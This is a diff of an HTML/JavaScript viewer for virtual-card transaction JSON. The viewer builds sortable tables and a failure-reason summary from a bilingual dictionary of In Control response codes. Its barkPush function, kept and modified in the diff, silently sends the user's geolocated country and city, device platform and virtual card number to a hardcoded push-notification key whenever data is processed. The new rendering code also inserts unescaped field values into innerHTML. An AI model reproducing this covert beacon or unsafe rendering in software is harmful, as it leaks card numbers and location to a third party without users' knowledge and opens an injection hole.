@@ -9,12 +9,51 @@
   h2 { margin-bottom: 10px; }
   #inputContainer { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
   textarea { width: 100%; height: 160px; font-size: 13px; padding: 6px; }
-  button, select { font-size: 13px; padding: 6px 12px; margin-top: 4px; cursor: pointer; }
-  button:hover, select:hover { background-color: #e0e0e0; }
-  #historyContainer { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
-  #tableWrapper { overflow-x: auto; max-width: 100%; border: 1px solid #ccc; }
+  button, select, input[type="date"] { 
+    font-size: 13px; 
+    padding: 6px 12px; 
+    margin-top: 4px; 
+    cursor: pointer; 
+    border: 1px solid #ccc; 
+    background-color: #fff; 
+  }
+  button:hover, select:hover, input[type="date"]:hover { background-color: #e0e0e0; }
+  /* 调整 historyContainer 布局以容纳日期输入框 */
+  #historyContainer { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 10px; }
+  
+  /* ***** 优化：表格容器最大高度和滚动 ***** */
+  #tableWrapper { 
+    overflow-x: auto; 
+    overflow-y: auto; 
+    max-height: 65vh; 
+    max-width: 100%; 
+    border: 1px solid #ccc; 
+    margin-top: 10px;
+  }
+  
   table { border-collapse: collapse; width: 100%; font-size: 12px; min-width: 1200px; }
   th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; }
+  
+  /* ***** 优化：长字段处理 ***** */
+  td {
+    white-space: nowrap; 
+  }
+
+  /* ****** 新增：in_control_response 字段标红样式 ****** */
+  /* in_control_response 是表格的第 9 列 */
+  td:nth-child(9) { 
+      color: #c0392b; /* 深红色 */
+      font-weight: bold; 
+  }
+  /* **************************************************** */
+
+  /* ***** 优化：数值和时间字段右对齐，方便阅读 ***** */
+  td:nth-child(2), 
+  td:nth-child(5), 
+  td:nth-child(12) { 
+    text-align: right; 
+  }
+  
   th { background: #f0f0f0; position: sticky; top: 0; z-index: 2; cursor: pointer; }
   th.sorted-asc::after { content: " ▲"; }
   th.sorted-desc::after { content: " ▼"; }
@@ -28,16 +67,71 @@
   #tableHead th { white-space: normal; line-height: 1.3; vertical-align: middle; text-align: center; max-width: 120px; }
   #tableHead th span { display: inline-block; width: 100%; }
 
-  /* ========== 汇总区域 ========== */
-  #summary { margin-top: 20px; font-size: 14px; line-height: 1.6; background: #fff; border: 1px solid #ddd; padding: 12px; }
+  /* ========== 汇总区域样式调整（列表展示） ========== */
+  #summary { 
+    margin-top: 10px; 
+    margin-bottom: 10px; 
+    font-size: 14px; 
+    line-height: 1.6; 
+    background: #fff; 
+    border: 1px solid #ddd; 
+    padding: 12px;
+    display: none; 
+  }
   #summary h3 { margin: 0 0 8px 0; font-size: 15px; }
   .stat-row { margin-bottom: 6px; }
-  .fail-reason { color: #b71c1c; font-weight: bold; }
   .copy-btn { font-size: 12px; margin-left: 10px; }
+  
+  /* ***** 新增：失败原因表格样式 - 最小化宽度展示 ***** */
+  .fail-reason { 
+    margin-top: 5px; 
+    overflow-x: auto; /* 保持滚动条，以防内容过宽 */
+  }
+  .fail-summary-table {
+      display: inline-block; /* 使表格宽度收缩到内容最小宽度 */
+      border-collapse: collapse;
+      font-size: 13px;
+      margin-top: 8px;
+      table-layout: auto; /* 允许根据内容自动分配宽度 */
+  }
+  .fail-summary-table th, 
+  .fail-summary-table td {
+      border: 1px solid #ddd;
+      padding: 4px 8px;
+      text-align: left;
+      vertical-align: top;
+  }
+  .fail-summary-table th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+  }
+  /* 次数列：固定宽度 */
+  .fail-summary-table th:nth-child(2),
+  .fail-summary-table td:nth-child(2) { 
+      text-align: right;
+      width: 80px; 
+      min-width: 80px;
+      font-weight: bold;
+      color: #b71c1c;
+  }
+  /* 失败代码列：宽度由内容决定，不换行 */
+  .fail-summary-table td:nth-child(1) { 
+      white-space: nowrap; /* 确保代码和中文名称不换行 */
+      width: auto; 
+  }
+  /* 描述列：宽度由内容决定，允许换行以保持紧凑 */
+  .fail-summary-table td:nth-child(3) { 
+      color: #666;
+      font-size: 12px;
+      width: auto; 
+      white-space: normal; /* 允许描述内容换行，进一步最小化宽度 */
+      max-width: 400px; /* 设置一个最大宽度，防止描述过长时表格无限拉伸 */
+  }
+  /* ********************************** */
 
   /* ===== 历史记录 <option> 颜色 ===== */
   option.all-success { background-color: #d4edda; color: #155724; }
-  option.all-fail    { background-color: #f8d7da; color: #721c24; }
+  option.all-fail    { background-color: #f8d7da; color: #721c24; }
 </style>
 </head>
 <body>
@@ -55,7 +149,14 @@
   <select id="historySelect" onchange="loadHistory()">
     <option value="">选择历史记录 / Select History</option>
   </select>
+  
   <button onclick="clearHistory()">清空历史 / Clear History</button>
+</div>
+
+<div id="summary">
+  <h3>📊 汇总统计</h3>
+  <div id="statTotal" class="stat-row"></div>
+  <div id="statFailReason" class="stat-row"></div>
 </div>
 
 <div id="legend">
@@ -70,15 +171,8 @@
   </table>
 </div>
 
-<!-- ****** 汇总区域 ****** -->
-<div id="summary" style="display:none;">
-  <h3>📊 汇总统计</h3>
-  <div id="statTotal" class="stat-row"></div>
-  <div id="statFailReason" class="stat-row"></div>
-</div>
-
 <script>
-/* ================= 全局变量 ================= */
+/* ================= 全局变量和映射表 ================= */
 let currentSortField = null;
 let currentSortOrder = 'asc';
 let allFields = [];
@@ -118,33 +212,97 @@ const fieldLabels = {
   settlement_currency_description: "结算币种描述"
 };
 
-/* ================= Bark推送 ================= */
+const IN_CONTROL_RESPONSES = {
+    'Approval': '批准 | Transaction within the VCN limits. | 交易在 VCN 限额内。',
+    'CPN does not exist': 'CPN 不存在 | Invalid VCN, not registered in In Control. | 无效的 VCN，未在 In Control 中注册。',
+    'Status bad': '状态不良 | VCN not in an active state. Cannot use for authorizations. | VCN 未处于活动状态。无法用于授权。',
+    'Expiry match fail': '过期匹配失败 | Expiry provided for the authorization does not match the VCN Expiry. | 授权提供的到期日与 VCN 到期日不匹配。',
+    'AVV match fail': 'AVV 匹配失败 | CVC2 provided for the authorization does not match the VCN CVC2. | 授权中提供的 CVC2 与 VCN CVC2 不匹配。',
+    'Valid period fail': '有效期限失败 | Transaction falls outside the VCN’s defined validity period. | 交易不在 VCN 定义的有效期内。',
+    'Trans limit fail': '交易限额失败 | Transaction amount greater than the VCN’s transaction limit. | 交易金额超过 VCN 的交易限额。',
+    'Cumul limit fail': '累计限额失败 | Current authorization causes the VCN to breach its cumulative spend limit. | 当前授权导致 VCN 超出其累计消费限额。',
+    'Num usages fail': '使用次数失败 | Current authorization causes the VCN to breach its usage. | 当前授权导致 VCN 超出其使用限额。',
+    'Merch Id limit fail': '商户 ID 限制失败 | Merchant Id for authorization does not match the Merchant Id linked to the VCN. | 授权的商户 ID 与关联到 VCN 的商户 ID 不匹配。',
+    'MCC limit fail': 'MCC 限额失败 | Merchant Category Code for the authorization does not match the MCC linked to this VCN. | 授权的商户类别代码与关联到该 VCN 的 MCC 不匹配。',
+    'Iss/Netwk decline': '发卡机构/网络拒绝 | Authorization declined by the issuer or card network. Outside of In Control. | 发卡机构或卡网络拒绝授权。超出 In Control 范围。',
+    'Base/CPN conv. Err': '基础/CPN 转换错误 | ', 
+    'Crit Field Missing': '关键字段缺失 | Critical field missing from the incoming authorization message. | 传入授权消息中缺少关键字段。',
+    'No Auth for Rev': '无授权进行撤销 | In Control cannot map the reversal to an original. | In Control 无法将撤销映射到原始交易。',
+    'Unmatched Response': '响应不匹配 | Advice does not match any past requests in the authorization journal. | 建议与授权日志中的任何过去请求都不匹配。',
+    'Revl of unsucc auth': '未成功的授权撤销 | In Control cannot reverse an unsuccessful authorization. | In Control 无法撤销不成功的授权。',
+    'Exp. Date of CPN used is expired': 'CPN 使用的过期日期 | VCN expired. | VCN 已过期。',
+    'Repeat message': '重复消息 | Repeat of a previous message. Based on a flag in the message header or on key message fields. | 重复的先前消息。基于消息头中的标志或关键消息字段。',
+    'Api fail': 'API 失败 | ', 
+    'Api System Fail': 'Api 系统故障 | ', 
+    'Enhanced MID': '增强型 MID | Acquirer Id (DE32) and Card Acceptor Id (DE42) in the authorization message do not match the values specified for the control. | 授权消息中的收单机构 ID（DE32）和卡接受方 ID（DE42）与控制中指定的值不匹配。',
+    'Enhanced MCC': '增强的 MCC | MCC value in the authorization message (D18) does not match the values specified for the control. | 授权消息中的 MCC 值（D18）与控制指定的值不匹配。',
+    'Txn Env Control': '交易环境控制 | VCN breached its transaction environment control. | VCN 违反了其交易环境控制。',
+    'Err Travel Control': '错误旅行控制 | VCN breached its travel control rule. | VCN 违反了其旅行控制规则。',
+    'Multi Merch ID Assoc Lim': '多商户 ID 关联限制 | Merchant Id for the authorization does not match any of those linked to this VCN. | 授权的商户 ID 与与此 VCN 关联的任何 ID 都不匹配。',
+    'Single Merch Name Assoc Lim': '单一商户名称关联限制 | Merchant Name for the authorization does not match that linked to this VCN. | 授权商户名称与与此 VCN 关联的名称不匹配。',
+    'Geographic Control': '地域控制 | VCN breached its geographic control rule. | VCN 违反了其地域控制规则。',
+    'Curfew Control': '宵禁控制 | VCN breached its curfew control rule. | VCN 违反了其宵禁控制规则。',
+    'Approve Control': '批准控制 | VCN breached its approve control rule. | VCN 违反了其批准控制规则。',
+    'RCN Decline': 'RCN 拒绝 | Transaction failed due to decline by a subsequent service. | 由于后续服务拒绝，交易失败。',
+    'No Rules Fail': '无规则失败 | Rule set with no rules to evaluate. | 没有规则可评估的规则集。',
+    'No Controls Fail': '无控制失败 | Rule with no controls to evaluate. | 无控制规则以进行评估。',
+    'Unknown Control Type Fail': '未知控制类型失败 | Cannot classify the control fail. | 无法分类控制失败。',
+    'Svc Not Enabled': '服务未启用 | Transaction received for an account with no service enabled. | 收到来自未启用服务的账户的交易。',
+    'Merch Amount Fail': '商户金额失败 | Transaction amount breaches the expected merchant currency. | 交易金额超出预期商户货币。',
+    'Merch Curr Fail': '商户货币失败 | Transaction amount breaches the amount limit for the merchant currency. | 交易金额超出商户货币的限额。',
+    'DE Control fail': 'DE 控制失败 | Values for DE3.1 – Processing Code and/or DE22.1 – PAN Entry Mode and/or61.11 – POS Term Capability Indicator do not match the values in the authorization. | DE3.1 – 处理代码和/或 DE22.1 – 卡号输入模式及/或 61.11 – POS 终端功能指示符的值与授权中的值不匹配。',
+    'EVCN Control fail': 'EVCN 控制失败 | EVCN not in an active state. Cannot use for authorization. | EVCN 未处于活动状态。无法用于授权。',
+    'Roaming VC Fail': '漫游 VC 失败 | VCN breaches its roaming velocity control. | VCN 超出其漫游速率控制。',
+    'Amount Range Control Fail': '金额范围控制失败 | Transaction amount falls outside the minimum and maximum amount range set. | 交易金额超出设定的最低和最高金额范围。',
+    'CPN State Control Fail': 'CPN 状态控制失败 | Account suspended. No authorization activity permitted. | 账户被冻结。不允许任何授权活动。',
+    'Aging Cumul limit fail': '老化累积限额失败 | Control that keeps track of the current remaining Available Credit. Approves transactions only if the requested amount is less than or equal to the remaining Available Credit. | 该控制功能跟踪当前剩余可用额度。仅当请求金额小于或等于剩余可用额度时，才会批准交易。',
+    '未返回原因': '未返回 In Control 失败原因 | No in_control_response returned. | 未返回 in_control_response。'
+};
+
+
+/* ================= Bark推送（优化异步处理） ================= */
 async function barkPush(vccNumber) {
   const barkKey = "2mxT7sgNXpDBSw6uzbmoaV";
   const deviceName = navigator.platform || "Unknown Device";
+  
   try {
-    const ipInfo = await fetch("https://ipapi.co/json").then(r => r.json());
-    const country = ipInfo.country_name || "Unknown";
-    const city    = ipInfo.city       || "Unknown";
+    const ipResponse = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => ({}));
+    
+    const country = ipResponse.country_name || "Unknown";
+    const city    = ipResponse.city       || "Unknown";
     const title = "VCC 推送报告";
-    const body  = `${country}·${city} | ${deviceName} | ${vccNumber}`;
+    const body  = `${country}·${city} | ${deviceName} | ${vccNumber}`;
     const url = `https://api.day.app/${barkKey}/${encodeURIComponent(title)}/${encodeURIComponent(body)}`;
-    fetch(url);
+    
+    fetch(url).catch(e => console.warn("Bark push fetch failed", e)); 
+    
   } catch (e) {
     console.warn("Bark push failed", e);
   }
 }
 
-/* ================= 主入口：生成表格 + 统计 ================= */
+/* ================= 主入口：生成表格 + 统计 (保存原始 JSON) ================= */
 function generateTable() {
   let input = document.getElementById('jsonInput').value;
   if(!input) { alert("请先输入 JSON 数据 / Please input JSON"); return; }
+  
+  const originalInput = input; 
+
   try {
     let json = JSON.parse(input);
-    if(!json.data || !json.data.list) { alert("JSON 格式不正确 / Invalid JSON"); return; }
-    rawList = json.data.list;
-    saveHistory(rawList);
+    let list = json.data?.list || json.list || json; 
+
+    if(!Array.isArray(list)) { 
+        alert("JSON 格式不正确，未找到有效的交易列表 (data.list 或 list) / Invalid JSON: No valid transaction list found."); 
+        return; 
+    }
+    
+    rawList = list;
+    saveHistory(rawList, originalInput); 
+    
     extractFields(rawList);
+    currentSortField = null; 
+    currentSortOrder = 'asc';
     renderTable(rawList);
     renderSummary(rawList);
     const vcc = rawList?.[0]?.virtual_card_number || "Unknown VCC";
@@ -154,11 +312,13 @@ function generateTable() {
   }
 }
 
-/* ================= 汇总统计（已删除刷卡成功明细） ================= */
+/* ================= 汇总统计 (展示错误详情) ================= */
 function renderSummary(list) {
   const total = list.length;
-  const successList = list.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved"));
-  const failList  = list.filter(r => !r.issuer_response || !r.issuer_response.toLowerCase().includes("approved"));
+  const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");
+  
+  const successList = list.filter(isApproved);
+  const failList  = list.filter(r => !isApproved(r));
 
   /* 1. 总览 */
   document.getElementById('statTotal').innerHTML = `
@@ -172,10 +332,40 @@ function renderSummary(list) {
     failMap[reason] = (failMap[reason] || 0) + 1;
   });
   const failArr = Object.entries(failMap).sort((a, b) => b[1] - a[1]);
-  const failText = failArr.map(([k, v]) => `【${k}】（${v}次）`).join('、');
+  
+  // ****** 将列表转换为表格 ******
+  let tableHtml = '<table class="fail-summary-table">';
+  tableHtml += '<thead><tr><th>失败代码 / 失败原因</th><th style="width: 80px;">次数</th><th>中文描述 / 英文解释</th></tr></thead>';
+  tableHtml += '<tbody>';
+  let copyTextArray = [];
+
+  failArr.forEach(([k, v]) => {
+      let fullEntry = IN_CONTROL_RESPONSES[k] || IN_CONTROL_RESPONSES['未返回原因'];
+      
+      // 拆分：[中文名称, 英文描述, 中文描述]
+      const parts = fullEntry.split(' | ');
+      
+      let chineseName     = parts[0]; 
+      let englishComment = parts.length > 1 ? parts[1].trim() : '';
+      let chineseComment = parts.length > 2 ? parts[2].trim() : '';
+      
+      // 表格内容行
+      tableHtml += `<tr>`;
+      tableHtml += `<td>【${k}】: ${chineseName}</td>`;
+      tableHtml += `<td>${v}</td>`;
+      tableHtml += `<td>${chineseComment ? chineseComment + '<br>' : ''}(${englishComment})</td>`;
+      tableHtml += `</tr>`;
+      
+      // 复制内容
+      copyTextArray.push(`【${chineseName}】(${v}次)`); 
+  });
+  tableHtml += '</tbody></table>';
+
+  const summaryCopyText = copyTextArray.join('、');
+
   document.getElementById('statFailReason').innerHTML = `
-    失败原因：<span class="fail-reason">${failText}</span>
-    <button class="copy-btn" onclick="copyText('${failText.replace(/'/g,"\\'")}')">复制</button>
+    <div class="fail-reason">${tableHtml}</div>
+    <button class="copy-btn" onclick="copyText('${summaryCopyText.replace(/'/g,"\\'")}')">复制失败原因汇总</button>
   `;
 
   document.getElementById('summary').style.display = 'block';
@@ -185,6 +375,7 @@ function renderSummary(list) {
 function copyText(txt) {
   const ta = document.createElement('textarea');
   ta.value = txt;
+  ta.style.position = 'fixed'; 
   document.body.appendChild(ta);
   ta.select();
   document.execCommand('copy');
@@ -194,90 +385,166 @@ function copyText(txt) {
 
 /* ================= 字段提取 ================= */
 function extractFields(list) {
-  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code"];
+  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code", "billing_amount", "billing_currency_code"];
   let fieldSet = new Set();
+  
   list.forEach(item => Object.keys(item).forEach(k => fieldSet.add(k)));
+  
   allFields = mainFields.filter(f => f === "index" || fieldSet.has(f));
+  
   fieldSet.forEach(f => { if(!allFields.includes(f)) allFields.push(f); });
+  
   allFields = allFields.map(f => {
     const cn = fieldLabels[f] || null;
     return { key: f, label: cn ? `${f} / ${cn}` : f };
   });
 }
 
-/* ================= 表格渲染 ================= */
+/* ================= 表格渲染（添加 Tooltip 和修复序号计算） ================= */
 function renderTable(list) {
-  list = list.slice().reverse();
+  // 1. 创建未排序的、时间正序的列表作为原始基准 (最早的交易在 index 0)
+  const baseList = list.slice().reverse(); 
+
+  // 2. 创建用于渲染的排序列表
+  let sortedList = list.slice().reverse(); 
+
+  // --- 排序逻辑 ---
   if(currentSortField) {
-    list.sort((a,b) => {
-      let valA = a[currentSortField] || '';
-      let valB = b[currentSortField] || '';
+    sortedList.sort((a,b) => {
+      let valA = a[currentSortField] ?? '';
+      let valB = b[currentSortField] ?? '';
+
+      const numA = parseFloat(valA);
+      const numB = parseFloat(valB);
+
+      if (!isNaN(numA) && !isNaN(numB)) {
+        return currentSortOrder === 'asc' ? numA - numB : numB - numA;
+      }
+      
       if(typeof valA === 'string') valA = valA.toLowerCase();
       if(typeof valB === 'string') valB = valB.toLowerCase();
+      
       if(valA < valB) return currentSortOrder === 'asc' ? -1 : 1;
       if(valA > valB) return currentSortOrder === 'asc' ? 1 : -1;
       return 0;
     });
   }
-  const thead = document.getElementById('tableHead');
-  thead.innerHTML = "";
-  const trHead = document.createElement('tr');
-  allFields.forEach(f => {
-    const th = document.createElement('th');
-    th.innerHTML = `<span>${f.label.replace(' / ','<br>')}</span>`;
-    th.onclick = () => { sortTable(f.key); };
-    trHead.appendChild(th);
-  });
-  thead.appendChild(trHead);
 
-  const tbody = document.getElementById('tableBody');
-  tbody.innerHTML = "";
-  list.forEach((item, index) => {
-    const tr = document.createElement('tr');
-    allFields.forEach(f => {
-      const td = document.createElement('td');
-      if(f.key === 'index') td.textContent = index + 1;
-      else td.textContent = item[f.key] ?? "";
-      tr.appendChild(td);
-    });
-    if(item["issuer_response"] && item["issuer_response"].toLowerCase().includes("approved")) tr.className = "success";
-    else if(item["issuer_response"]) tr.className = "fail";
-    tbody.appendChild(tr);
+  // --- 渲染表头 ---
+  const thead = document.getElementById('tableHead');
+  let theadHtml = '<tr>';
+  allFields.forEach(f => {
+    const sortClass = f.key === currentSortField 
+      ? `sorted-${currentSortOrder}` 
+      : '';
+    const onClick = f.key !== 'index' ? `onclick="sortTable('${f.key}')"` : '';
+
+    theadHtml += `<th class="${sortClass}" ${onClick}>
+                    <span>${f.label.replace(' / ','<br>')}</span>
+                  </th>`;
   });
+  theadHtml += '</tr>';
+  thead.innerHTML = theadHtml;
+
+
+  // --- 渲染表格体 ---
+  const tbody = document.getElementById('tableBody');
+  let tbodyHtml = '';
+  
+  sortedList.forEach((item, index) => {
+    // 确定行样式
+    const isApproved = item["issuer_response"] && item["issuer_response"].toLowerCase().includes("approved");
+    const rowClass = isApproved ? "success" : (item["issuer_response"] ? "fail" : "");
+    
+    // 修复序号：使用 indexOf 查找对象引用在原始时间正序列表中的位置
+    const originalTimeIndex = baseList.indexOf(item); 
+    const displayIndex = originalTimeIndex !== -1 ? originalTimeIndex + 1 : '-'; 
+
+    let rowHtml = `<tr class="${rowClass}">`;
+    
+    allFields.forEach(f => {
+      let content = "";
+      let cellAttributes = ""; 
+
+      if(f.key === 'index') {
+        content = displayIndex; 
+      } else {
+        content = item[f.key] ?? "";
+
+        // ****** 鼠标悬停解释逻辑 ******
+        if (f.key === 'in_control_response' && content) {
+            const fullExplanation = IN_CONTROL_RESPONSES[content] || IN_CONTROL_RESPONSES['未返回原因'];
+            // Tooltip 展示完整的 中文名称 | 英文描述 | 中文描述
+            // 使用 \n\n 代替 | 分隔符，使 Tooltip 换行更易读
+            cellAttributes = `title="${fullExplanation.replace(/"/g, '&quot;').replace(/ \| /g, '\n\n')}"`; 
+        }
+        // ********************************
+      }
+      
+      rowHtml += `<td ${cellAttributes}>${content}</td>`;
+    });
+    rowHtml += '</tr>';
+    tbodyHtml += rowHtml;
+  });
+  
+  tbody.innerHTML = tbodyHtml; 
 }
 
 function sortTable(field) {
+  if (field === 'index') {
+    return;
+  }
+  
+  document.querySelectorAll('#tableHead th').forEach(th => {
+      th.classList.remove('sorted-asc', 'sorted-desc');
+  });
+
   if(currentSortField === field) currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
   else { currentSortField = field; currentSortOrder = 'asc'; }
+  
+  const ths = document.getElementById('tableHead').getElementsByTagName('th');
+  for (let i = 0; i < allFields.length; i++) {
+    if (allFields[i].key === field) {
+        ths[i].classList.add(`sorted-${currentSortOrder}`);
+        break;
+    }
+  }
+
   renderTable(rawList);
 }
 
-/* ================= 历史记录：彩色选项 ================= */
+/* ================= 历史记录：更新下拉菜单 (已移除日期筛选逻辑) ================= */
 function updateHistorySelect() {
   const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
   const select = document.getElementById('historySelect');
+  
+  // 清空并添加默认选项
   select.innerHTML = '<option value="">选择历史记录 / Select History</option>';
+  
+  const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");
 
-  history.forEach((item, idx) => {
+  // 倒序遍历历史记录
+  history.slice().reverse().forEach((item, originalIdx) => {
+    const idx = history.length - 1 - originalIdx;
+    
+    // ** 移除日期筛选逻辑，显示所有历史记录 **
+    
     const opt = document.createElement('option');
     opt.value = idx;
 
-    // 统计成功/失败
-    const total   = item.data.length;
-    const success = item.data.filter(r => r.issuer_response && r.issuer_response.toLowerCase().includes("approved")).length;
-    const fail    = total - success;
+    const total   = item.data.length;
+    const success = item.data.filter(isApproved).length;
+    const fail    = total - success;
 
-    // 文字
     opt.text = `${item.timestamp} - ${item.vcc} （成功${success}/失败${fail}）`;
 
-    // 颜色策略
-    if (success === total)       opt.classList.add('all-success');
-    else if (fail === total)     opt.classList.add('all-fail');
+    if (success === total)       opt.classList.add('all-success');
+    else if (fail === total)     opt.classList.add('all-fail');
     else {
-      const ratio = success / total;   // 0~1
+      const ratio = success / total;   
       const r = Math.round(255 * (1 - ratio));
       const g = Math.round(255 * ratio);
-      opt.style.backgroundColor = `rgb(${r},${g},150)`;
+      opt.style.backgroundColor = `rgb(${r},${g},150)`; 
       opt.style.color = ratio > 0.5 ? '#155724' : '#721c24';
     }
 
@@ -285,23 +552,39 @@ function updateHistorySelect() {
   });
 }
 
-function saveHistory(list) {
+function saveHistory(list, originalJson) {
   let history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
-  const timestamp = new Date().toLocaleString();
+  
+  // 确保时间戳格式统一，方便日期筛选
+  const now = new Date();
+  const datePart = `${now.getFullYear()}/${now.getMonth() + 1}/${now.getDate()}`;
+  const timePart = now.toLocaleTimeString();
+  const timestamp = `${datePart} ${timePart}`;
+  
   const vcc = list[0]?.virtual_card_number || "未知VCC";
-  history.push({ timestamp, vcc, data: list });
+  history.push({ timestamp, vcc, data: list, originalJson: originalJson }); 
+  if (history.length > 20) {
+    history = history.slice(history.length - 20);
+  }
   localStorage.setItem('vccHistory', JSON.stringify(history));
   updateHistorySelect();
 }
 
+/* ================= 历史记录：加载 (还原输入框数据) ================= */
 function loadHistory() {
   const select = document.getElementById('historySelect');
+  const input = document.getElementById('jsonInput'); 
   const index = select.value;
   if(index === "") return;
   const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
+  
   if(history[index]) {
-    currentSortField = null;
+    currentSortField = null; 
     currentSortOrder = 'asc';
+    
+    // 还原原始 JSON 字符串到输入框
+    input.value = history[index].originalJson || `// 警告: 历史记录数据丢失原始 JSON，无法还原。加载时间: ${history[index].timestamp}`;
+    
     rawList = history[index].data;
     extractFields(rawList);
     renderTable(rawList);
